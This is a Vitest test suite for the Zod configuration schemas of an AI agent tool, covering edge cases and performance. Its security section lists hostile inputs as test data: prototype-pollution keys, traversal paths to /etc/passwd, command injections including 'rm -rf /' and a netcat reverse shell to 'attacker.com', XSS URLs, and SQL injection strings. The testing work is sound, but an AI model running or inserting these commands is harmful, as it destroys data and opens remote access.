/**
 * Zod Schema Edge Cases and Security Testing Suite
 *
 * This test suite focuses on:
 * - Edge case validation scenarios
 * - Security-focused input validation
 * - Performance testing with extreme inputs
 * - Error boundary testing
 * - Type safety validation
 *
 * @author QA Engineer - Testing Stage
 * @date 2026-03-05
 */

import { describe, it, expect, test } from 'vitest';
import { z } from 'zod';
import {
  ApexConfigSchema,
  ProjectConfigSchema,
  AutonomyConfigSchema,
  AgentDefinitionSchema,
  FilesystemToolConfigSchema,
  ShellToolConfigSchema,
  WebToolConfigSchema,
  BrowserToolConfigSchema,
  MCPConfigSchema,
  WorkflowDefinitionSchema,
  TaskStatusSchema,
  PermissionSchema,
} from '../packages/core/src/types.js';

describe('Zod Schema Edge Cases and Security Testing', () => {

  describe('Input Validation Edge Cases', () => {
    it('should handle extremely long strings gracefully', () => {
      const longString = 'a'.repeat(100000); // 100KB string

      const configWithLongStrings = {
        project: {
          name: 'test',
          description: longString
        }
      };

      // Should validate but might be a concern for practical use
      expect(() => ApexConfigSchema.parse(configWithLongStrings)).not.toThrow();

      const parsed = ApexConfigSchema.parse(configWithLongStrings);
      expect(parsed.project.description).toHaveLength(100000);
    });

    it('should handle deeply nested objects', () => {
      const deeplyNestedMCP = {
        project: { name: 'deep-test' },
        mcp: {
          enabled: true,
          servers: Array.from({ length: 1000 }, (_, i) => ({
            name: `server-${i}`,
            command: 'node',
            args: Array.from({ length: 50 }, (_, j) => `arg-${i}-${j}`),
            env: Object.fromEntries(
              Array.from({ length: 100 }, (_, k) => [`ENV_${k}`, `value-${i}-${k}`])
            )
          }))
        }
      };

      const startTime = Date.now();
      expect(() => ApexConfigSchema.parse(deeplyNestedMCP)).not.toThrow();
      const endTime = Date.now();

      // Should complete in reasonable time despite complexity
      expect(endTime - startTime).toBeLessThan(1000); // Under 1 second

      const parsed = ApexConfigSchema.parse(deeplyNestedMCP);
      expect(parsed.mcp?.servers).toHaveLength(1000);
      expect(parsed.mcp?.servers[0].args).toHaveLength(50);
    });

    it('should handle special number values', () => {
      const extremeNumbers = {
        project: { name: 'number-test' },
        limits: {
          maxTokensPerTask: Number.MAX_SAFE_INTEGER,
          maxCostPerTask: Number.MAX_VALUE,
          dailyBudget: Number.POSITIVE_INFINITY, // Should this be allowed?
          maxTurns: 0, // Edge case: zero turns
          maxConcurrentTasks: -1, // Negative number
          maxRetries: 999999999999
        }
      };

      // Schema should handle these or use defaults appropriately
      const parsed = ApexConfigSchema.parse(extremeNumbers);
      expect(parsed.limits?.maxTokensPerTask).toBeDefined();
      expect(parsed.limits?.maxCostPerTask).toBeDefined();
    });

    it('should handle empty and whitespace-only strings', () => {
      const whitespaceConfig = {
        project: {
          name: '   ',  // Whitespace-only name
          description: '\t\n\r'  // Mixed whitespace
        }
      };

      // Project name with only whitespace might be invalid
      const result = ProjectConfigSchema.parse(whitespaceConfig.project);
      expect(result.name).toBe('   '); // Schema may allow this
    });

    it('should validate arrays with extreme sizes', () => {
      const largeArrayConfig = {
        project: { name: 'array-test' },
        agents: {
          enabled: Array.from({ length: 10000 }, (_, i) => `agent-${i}`)
        }
      };

      expect(() => ApexConfigSchema.parse(largeArrayConfig)).not.toThrow();
      const parsed = ApexConfigSchema.parse(largeArrayConfig);
      expect(parsed.agents?.enabled).toHaveLength(10000);
    });

    it('should handle circular reference attempts in configuration', () => {
      // Create a configuration that might cause issues with circular refs
      const circularConfig: any = {
        project: { name: 'circular-test' }
      };

      // Try to create a circular reference
      circularConfig.self = circularConfig;

      // Zod should handle this gracefully or throw appropriate error
      try {
        const result = ApexConfigSchema.parse(circularConfig);
        // If parsing succeeds, the 'self' property should be ignored (not in schema)
        expect(result.self).toBeUndefined();
      } catch (error) {
        // If it throws, that's also acceptable behavior
        expect(error).toBeDefined();
      }
    });
  });

  describe('Security-focused Input Validation', () => {
    it('should not be vulnerable to prototype pollution attempts', () => {
      const prototypePolluionAttempt = {
        project: { name: 'security-test' },
        '__proto__': { isAdmin: true },
        'constructor': { prototype: { isAdmin: true } },
        tools: {
          shell: {
            enabled: true,
            environment: {
              '__proto__': 'polluted',
              'constructor.prototype.hacked': 'true'
            }
          }
        }
      };

      const parsed = ApexConfigSchema.parse(prototypePolluionAttempt);

      // Verify prototype pollution didn't occur
      expect((Object.prototype as any).isAdmin).toBeUndefined();
      expect((Object.prototype as any).hacked).toBeUndefined();
      expect(parsed.project.name).toBe('security-test');
    });

    it('should handle potentially dangerous file paths safely', () => {
      const dangerousPathConfig = {
        enabled: true,
        allowedDirectories: [
          '../../../etc',
          '../../../../windows/system32',
          '/etc/passwd',
          'C:\\Windows\\System32',
          '\\\\network\\share',
          '/dev/null',
          '/proc/self/mem'
        ],
        blockedDirectories: [
          '../../..',
          '../../../../../'
        ]
      };

      // Schema should accept these as strings (security enforcement at runtime)
      expect(() => FilesystemToolConfigSchema.parse(dangerousPathConfig)).not.toThrow();
      const parsed = FilesystemToolConfigSchema.parse(dangerousPathConfig);
      expect(parsed.allowedDirectories).toContain('../../../etc');
    });

    it('should handle command injection attempts in shell configuration', () => {
      const commandInjectionConfig = {
        enabled: true,
        allowedCommands: [
          'git; rm -rf /',
          'npm && curl malicious.com',
          'node || wget evil.sh',
          'echo $(whoami)',
          'ls `cat /etc/passwd`',
          'git & nc -e /bin/sh attacker.com 1234'
        ],
        blockedCommands: [
          'rm',
          'curl'
        ],
        environment: {
          'PATH': '/bin:/usr/bin; rm -rf /',
          'SHELL': '/bin/bash; echo hacked',
          'NODE_ENV': 'production`whoami`'
        }
      };

      // Schema should accept these strings (validation happens at runtime)
      expect(() => ShellToolConfigSchema.parse(commandInjectionConfig)).not.toThrow();
      const parsed = ShellToolConfigSchema.parse(commandInjectionConfig);
      expect(parsed.allowedCommands).toContain('git; rm -rf /');
      expect(parsed.environment?.PATH).toContain('; rm -rf /');
    });

    it('should handle malicious URLs in web configuration', () => {
      const maliciousUrlConfig = {
        enabled: true,
        allowedDomains: [
          'javascript:alert("xss")',
          'data:text/html,<script>alert("xss")</script>',
          'file:///etc/passwd',
          'ftp://anonymous:anonymous@evil.com',
          'about:blank',
          'vbscript:msgbox("xss")',
          '192.168.1.1/admin',
          'localhost/../../../etc/passwd'
        ]
      };

      // Schema should accept these as domain strings
      expect(() => WebToolConfigSchema.parse(maliciousUrlConfig)).not.toThrow();
      const parsed = WebToolConfigSchema.parse(maliciousUrlConfig);
      expect(parsed.allowedDomains).toContain('javascript:alert("xss")');
    });

    it('should validate against SQL injection attempts in MCP server configs', () => {
      const sqlInjectionMCP = {
        enabled: true,
        servers: [
          {
            name: 'test\'; DROP TABLE users; --',
            command: 'node\' || rm -rf /',
            args: [
              '--db-url="postgresql://user:pass@host/db\'; DROP DATABASE db; --"',
              '--query=\' OR 1=1; --',
              '$(rm -rf /)'
            ]
          }
        ]
      };

      expect(() => MCPConfigSchema.parse(sqlInjectionMCP)).not.toThrow();
      const parsed = MCPConfigSchema.parse(sqlInjectionMCP);
      expect(parsed.servers[0].name).toContain('DROP TABLE');
    });
  });

  describe('Type Safety and Inference Edge Cases', () => {
    it('should maintain type safety with complex discriminated unions', () => {
      // Test complex schema composition and type inference
      const complexAgent = {
        name: 'complex-agent',
        description: 'Agent with complex configuration',
        model: 'opus' as const,
        tools: ['Read', 'Write', 'Edit'] as const,
        skills: ['typescript', 'testing']
      };

      const parsed = AgentDefinitionSchema.parse(complexAgent);

      // These should be properly typed
      const agentName: string = parsed.name;
      const agentModel: 'opus' | 'sonnet' | 'haiku' | 'inherit' | undefined = parsed.model;
      const agentTools: string[] | undefined = parsed.tools;

      expect(agentName).toBe('complex-agent');
      expect(agentModel).toBe('opus');
      expect(agentTools).toEqual(['Read', 'Write', 'Edit']);
    });

    it('should handle union type validation properly', () => {
      // Test TaskStatus enum validation
      const validStatuses = [
        'pending', 'queued', 'planning', 'in-progress',
        'waiting-approval', 'awaiting-approval', 'paused',
        'completed', 'failed', 'cancelled'
      ];

      validStatuses.forEach(status => {
        expect(() => TaskStatusSchema.parse(status)).not.toThrow();
        const parsed = TaskStatusSchema.parse(status);
        expect(parsed).toBe(status);
      });

      // Invalid statuses should fail
      const invalidStatuses = ['invalid', 'unknown', 'processing', ''];
      invalidStatuses.forEach(status => {
        expect(() => TaskStatusSchema.parse(status)).toThrow();
      });
    });

    it('should properly validate optional vs required fields', () => {
      // Test with missing optional fields
      const minimalPermission = {
        tool: 'filesystem',
        level: 'allow-once' as const,
        createdAt: new Date()
      };

      expect(() => PermissionSchema.parse(minimalPermission)).not.toThrow();

      // Test with missing required fields
      const invalidPermission = {
        level: 'allow-once' as const,
        createdAt: new Date()
        // Missing required 'tool' field
      };

      expect(() => PermissionSchema.parse(invalidPermission)).toThrow();
    });
  });

  describe('Error Boundary and Recovery Testing', () => {
    it('should provide detailed error information for nested validation failures', () => {
      const invalidNestedConfig = {
        project: { name: 'test' },
        autonomy: {
          level: 'invalid-level',
          approvalTimeout: -1
        },
        tools: {
          filesystem: {
            enabled: 'not-boolean',
            maxFileSize: 'not-number'
          },
          browser: {
            viewport: {
              width: 'invalid',
              height: null
            }
          }
        }
      };

      try {
        ApexConfigSchema.parse(invalidNestedConfig);
        expect.fail('Should have thrown validation error');
      } catch (error: any) {
        expect(error.issues).toBeDefined();
        expect(error.issues.length).toBeGreaterThan(1);

        // Should have specific path information
        const autonomyError = error.issues.find((issue: any) =>
          issue.path.includes('autonomy') && issue.path.includes('level')
        );
        expect(autonomyError).toBeDefined();
        expect(autonomyError?.code).toBe('invalid_enum_value');

        // Should have nested path information
        const filesystemError = error.issues.find((issue: any) =>
          issue.path.includes('tools') && issue.path.includes('filesystem')
        );
        expect(filesystemError).toBeDefined();
      }
    });

    it('should handle schema validation with undefined vs null distinction', () => {
      const configWithUndefined = {
        project: { name: 'test' },
        autonomy: undefined, // Explicitly undefined
        models: null as any, // Explicitly null
        tools: {
          filesystem: {
            enabled: true,
            allowedExtensions: undefined, // Optional array field
            blockedExtensions: null as any // Should this be different?
          }
        }
      };

      // Test how schema handles undefined vs null for optional fields
      const parsed = ApexConfigSchema.parse(configWithUndefined);
      expect(parsed.autonomy).toBeUndefined();
      expect(parsed.models).toBeNull(); // Or should this be coerced?
    });

    it('should validate performance with complex nested schemas', () => {
      const complexWorkflow = {
        name: 'performance-test-workflow',
        description: 'Complex workflow for performance testing',
        stages: Array.from({ length: 100 }, (_, i) => ({
          name: `stage-${i}`,
          description: `Stage ${i} description`,
          agent: `agent-${i % 10}`,
          dependencies: i > 0 ? [`stage-${i - 1}`] : [],
          timeout: 600,
          retries: 3
        })),
        gates: Array.from({ length: 50 }, (_, i) => ({
          id: `gate-${i}`,
          name: `Gate ${i}`,
          description: `Approval gate ${i}`,
          trigger: `stage:stage-${i}:completed`,
          required: true,
          approvers: [`team-${i % 5}`],
          timeout: 300
        }))
      };

      const startTime = Date.now();
      expect(() => WorkflowDefinitionSchema.parse(complexWorkflow)).not.toThrow();
      const endTime = Date.now();

      // Should parse complex workflow quickly
      expect(endTime - startTime).toBeLessThan(200); // Under 200ms

      const parsed = WorkflowDefinitionSchema.parse(complexWorkflow);
      expect(parsed.stages).toHaveLength(100);
      expect(parsed.gates).toHaveLength(50);
    });
  });

  describe('Real-world Configuration Stress Testing', () => {
    it('should handle production-scale configuration', () => {
      const productionScaleConfig = {
        version: '1.0',
        project: {
          name: 'enterprise-monolith',
          description: 'Large-scale enterprise application with microservices',
          keywords: Array.from({ length: 100 }, (_, i) => `keyword-${i}`)
        },
        autonomy: {
          level: 'review-before-commit' as const,
          approvalTimeout: 1800,
          agentOverrides: Object.fromEntries(
            Array.from({ length: 50 }, (_, i) => [`agent-${i}`, 'review-all' as const])
          )
        },
        agents: {
          enabled: Array.from({ length: 200 }, (_, i) => `agent-${i}`),
          disabled: Array.from({ length: 50 }, (_, i) => `deprecated-agent-${i}`)
        },
        tools: {
          filesystem: {
            enabled: true,
            allowedExtensions: [
              '.ts', '.tsx', '.js', '.jsx', '.json', '.yaml', '.yml', '.md',
              '.html', '.css', '.scss', '.less', '.vue', '.svelte', '.php',
              '.py', '.rb', '.go', '.rs', '.java', '.kt', '.swift', '.dart',
              '.cs', '.fs', '.vb', '.cpp', '.c', '.h', '.hpp', '.sql', '.sh'
            ],
            allowedDirectories: Array.from({ length: 100 }, (_, i) => `/project/module-${i}`)
          },
          browser: {
            enabled: true,
            engine: 'chromium' as const,
            allowedDomains: Array.from({ length: 500 }, (_, i) => `service-${i}.company.com`)
          }
        },
        mcp: {
          enabled: true,
          servers: Array.from({ length: 20 }, (_, i) => ({
            name: `service-${i}`,
            command: 'docker',
            args: ['run', '-p', `${3000 + i}:3000`, `service-${i}:latest`],
            env: Object.fromEntries(
              Array.from({ length: 20 }, (_, j) => [`SERVICE_${j}_URL`, `http://service-${j}.internal:3000`])
            )
          }))
        }
      };

      const startTime = Date.now();
      expect(() => ApexConfigSchema.parse(productionScaleConfig)).not.toThrow();
      const endTime = Date.now();

      // Should handle production scale efficiently
      expect(endTime - startTime).toBeLessThan(500); // Under 500ms

      const parsed = ApexConfigSchema.parse(productionScaleConfig);
      expect(parsed.agents?.enabled).toHaveLength(200);
      expect(parsed.tools?.filesystem?.allowedExtensions).toHaveLength(33);
      expect(parsed.mcp?.servers).toHaveLength(20);
    });

    it('should maintain validation integrity under memory pressure', () => {
      // Test multiple large configurations in sequence to check for memory leaks
      for (let i = 0; i < 100; i++) {
        const largeConfig = {
          project: { name: `test-${i}` },
          mcp: {
            enabled: true,
            servers: Array.from({ length: 50 }, (_, j) => ({
              name: `server-${i}-${j}`,
              command: 'node',
              args: Array.from({ length: 20 }, (_, k) => `arg-${k}`),
              env: Object.fromEntries(
                Array.from({ length: 50 }, (_, l) => [`VAR_${l}`, `value-${i}-${j}-${l}`])
              )
            }))
          }
        };

        expect(() => ApexConfigSchema.parse(largeConfig)).not.toThrow();
      }
    });

    it('should validate concurrent schema parsing', async () => {
      // Test concurrent validation to ensure thread safety
      const configs = Array.from({ length: 50 }, (_, i) => ({
        project: { name: `concurrent-test-${i}` },
        autonomy: { level: 'full-auto' as const },
        tools: {
          filesystem: {
            enabled: true,
            maxFileSize: 1024 * i
          }
        }
      }));

      const startTime = Date.now();
      const promises = configs.map(config =>
        Promise.resolve().then(() => ApexConfigSchema.parse(config))
      );

      const results = await Promise.all(promises);
      const endTime = Date.now();

      expect(results).toHaveLength(50);
      expect(endTime - startTime).toBeLessThan(1000); // Should be fast

      results.forEach((result, i) => {
        expect(result.project.name).toBe(`concurrent-test-${i}`);
      });
    });
  });
});